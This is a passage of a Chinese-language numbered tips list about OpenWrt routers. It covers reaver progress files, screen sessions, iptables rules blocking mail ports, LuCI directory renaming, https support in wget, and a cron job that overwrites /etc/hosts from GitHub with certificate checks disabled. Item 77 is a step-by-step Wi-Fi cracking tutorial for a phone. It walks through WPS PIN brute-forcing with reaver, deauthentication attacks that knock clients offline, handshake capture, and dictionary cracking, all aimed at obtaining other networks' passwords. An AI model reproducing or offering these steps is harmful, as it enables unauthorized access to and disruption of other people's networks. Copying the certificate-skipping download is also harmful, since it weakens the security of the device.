关于进度保存位置，1.3版本的reaver默认保存在/etc/reaver/[目标路由MAC].wpc

1.4版本（路由装的是1.4）默认保存在/usr/local/etc/reaver/[目标路由MAC].wpc。

经过我实测，路由装ipk的版本的保存位置是你运行命令的目录（如果你没有用参数去指定的话），一般是/root/，下面有很多wpc文件。/etc/reaver有个reaver.db文件，应该与进度无关。


创建一个screen

$ screen
/var/run/utmp: No such file or directory
[detached from 17067.pts-1.OpenWrt]

可以看到退出的时候提供了这个screen的id：17067

可以按下Ctrl+A+D来暂时退出这个Screen会话

回来后，打开电脑连接ssh路由，然后键入

$ screen –r 17067

退出当前screen可以输入exit

----------------------------------------------------------------------------------------------------------------
75、Linux / CentOS 服务器屏蔽邮件端口邮箱端口

iptables -A OUTPUT -p tcp -m multiport --dport 24,25,50,57,105,106,109,110,143,158,209,218,220,465,587 -j REJECT --reject-with tcp-reset
iptables -A OUTPUT -p tcp -m multiport --dport 993,995,1109,24554,60177,60179 -j REJECT --reject-with tcp-reset
iptables -A OUTPUT -p udp -m multiport --dport 24,25,50,57,105,106,109,110,143,158,209,218,220,465,587 -j DROP
iptables -A OUTPUT -p udp -m multiport --dport 993,995,1109,24554,60177,60179 -j DROP

----------------------------------------------------------------------------------------------------------------
76、OpenWrt Luci 目录更名

SFTP 登录 OpenWrt，进入 /www/cgi-bin/，将luci 重命名为 xxx 即可。
index.html 页面修改/cgi-bin/luci 目录为新目录。

----------------------------------------------------------------------------------------------------------------
77、BCM4330芯片的手机比如魅族MX2的WIFI破解教程

解压文件，得到4个APK文件，首先安装busybox ，完了之后如出现备份选项可以取消，然后依次点标准安装，再点智能安装
其它3个APK依次安装完成即可，然后重启下手机。（推荐再安装个wifi连接管理器）
打开wifi连接管理器或者其它同类工具，找个信号比较好的，最好有wps的，能记下MAC地址和信道
首先打开bcmon，第一次进入会要求安装驱动，确定，之后“启用监听模式”，此前如果WIFI为开启状态，会直接灯灭，可以不理会
直接点击bcmon终端模拟器，会自动调用终端模拟器窗口，写入reaver 后按回车，会出现可用命令（可以参考2楼）
个人推荐指令   reaver -i wlan0 -b MAC地址(用:分开，大写) -v -c X(信道号) 
-vv命令出现的信息太多，这里推荐 -v  
已知pin前4位的可以跟 -p XXXX   已知8位的就XXXXXXXX，可以拿自己家的WIFI测试  原理就是猜pin码，得wifi密码
-c X 可以减少扫描时间，另外中间都有空格隔开，注意大小写
至此pin部分结束

下面抓包部分，也叫握手包，首先还是要开启bcmon的监听模式
打开aircrackgui程序，第一页“扫描/fake auth”
点扫描网络，会出现附近wifi的SSID和加密方式，选择一个信号好的，可以在wifi连接管理器里看
向右滑动屏幕，第二页”抓包/Deauth攻击“
点开始抓包，稍等，点扫描客户端，然后下面窗口可以看到此路由连接的客户端
然后就可以点右边的”广播或者指定的客户端“进行Eeauth攻击，此时客户端和路由器会被强制断线后重新连接，以获取连接的信息，也正是抓包过程
抓包过程跟客户端数量和信号强度有关系，一次不够就间隔地试几次，知道最上面信息出现handshake + MAC地址出现
这时可以停止抓包
第三页可以不理会，那是破解WEP加密的，现在几乎没人用了
至此抓包部分结束

抓完包就是跑包了，需要用到字典，好的字典是必须的，百度下会有很多，不推荐用手机跑包，发热大，效率也不高，故不谈手机端跑包法
这里推荐把握手包cap文件拷贝到PC下用EWSA专业级别软件跑
已经抓包完毕的握手包会存放在sdcard0/aircrackgui/capture文件夹下，以SSID名.cap命名

----------------------------------------------------------------------------------------------------------------
78、OpenWrt支持https下载和OpenWrt支持SSL下载的方法/ OpenWrt wget 支持https

默认的wget是不支持https协议下载的。

1、升级wget
 
$ opkg update
$ opkg inistall wget
 
$ mkdir -p /etc/ssl/certs
$ export SSL_CERT_DIR=/etc/ssl/certs
$ source /etc/profile

$ opkg install ca-certificates   # 证书会放在 /etc/ssl/certs 目录，一共大约 541Kb.
 
之后就可以支持 https 和 ssl 了
 
----------------------------------------------------------------------------------------------------------------
79、OpenWrt下自动下载更新HOSTS文件，OpenWrt自动下载覆盖原文件，方法

首先更新wget，见78方法：
然后只需将以下执行计划复制粘贴到 Luci - System - Scheduled Tasks 的 crontab 执行命令里即可：

网上自动更新HOSTS
01 06 * * * wget -q https://raw.githubusercontent.com/racaljk/hosts/master/hosts -O /etc/hosts --no-check-certificate ; /etc/init.d/dnsmasq restart

自己编译的HOSTS
01 06 * * * wget -q https://raw.githubusercontent.com/cscq/csc/master/wifi/index -O /etc/hosts --no-check-certificate ; /etc/init.d/dnsmasq restart

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------

----------------------------------------------------------------------------------------------------------------
